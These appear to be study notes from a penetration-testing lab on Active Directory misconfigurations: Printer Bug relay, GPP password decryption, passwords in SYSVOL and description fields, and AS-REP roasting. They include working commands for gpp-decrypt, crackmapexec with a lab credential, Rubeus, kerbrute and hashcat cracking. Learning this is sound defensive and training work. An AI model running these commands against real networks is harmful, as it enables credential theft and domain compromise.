# Miscellaneous Misconfigurations

## Exchange-Related Issues

* Misconfigured **Exchange Windows Permissions** can grant unintended DCSync rights.
* **Organization Management** members have extensive Exchange and mailbox control.
* Compromised Exchange servers may expose credentials.
* **PrivExchange** abuses the PushSubscription feature to enable NTLM relay attacks.

---

## Printer Bug (MS-RPRN)

* MS-RPRN flaws allow NTLM relay via Print Spooler.
* Can result in DCSync or RBCD exploitation.
* Works across forest trusts.

### Example

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

---

## MS14-068 (Kerberos PAC Forging)

* Allows forging Kerberos PACs for privilege escalation.
* Remediation requires patching.

---

## Sniffing LDAP Credentials

* Applications or printers may store LDAP credentials insecurely.
* Netcat or packet capture tools may reveal plaintext or weakly protected LDAP traffic.

---

## Enumerating DNS Records (adidnsdump)

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

---

## Other Misconfigurations

### Passwords in Description Fields

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Flag

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SYSVOL

```bash
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

---

## Group Policy Preferences (GPP)

* GPP XML files may contain `cpassword` values that can be decrypted.

### Examples

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
crackmapexec smb -L | grep gpp
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

---

## AS-REP Roasting

* Targets accounts without Kerberos pre-authentication.

### Examples

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```bash
./Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

---

## Group Policy Object (GPO) Abuse

* Misconfigured GPOs can enable privilege escalation or persistence.
* Common abuses include:

  * Adding local administrators
  * Creating scheduled tasks
  * Granting elevated rights to users
